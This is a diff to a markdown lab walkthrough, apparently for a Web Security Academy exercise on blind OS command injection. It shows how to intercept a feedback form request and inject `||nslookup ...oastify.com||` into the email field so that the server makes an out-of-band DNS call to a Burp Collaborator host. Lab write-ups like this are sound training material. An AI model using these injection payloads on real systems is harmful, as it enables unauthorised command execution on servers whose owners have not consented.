@@ -12,5 +12,37 @@
 
 ### step 1
 
-// professtional verion use
-burp collector
+click on submit feedback and intercept the request
+
+![[lab4_0.png]]
+
+![[lab4_1.png]]
+
+
+step 2
+
+add `email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`
+
+burp collaborator => `ne5hvt6bna30e2cdp7h3vkix3o9fx5lu.oastify.com`
+
+final payload 
+`email=x||nslookup+x.ne5hvt6bna30e2cdp7h3vkix3o9fx5lu.oastify.com||`
+
+
+![[lab4_2.png]]
+
+![[lab4_3.png]]
+
+step 3 
+
+`email=test1%40email.com||nslookup+test1%40email.com.ne5hvt6bna30e2cdp7h3vkix3o9fx5lu.oastify.com||`
+replace email with payload and forward request
+go to  burp collaborator you will see some DNS if you can't see click on poll now and lab will solved
+
+![[lab4_4.png]]
+
+![[lab4_5.png]]
+
+
+![[lab4_6.png]]
+
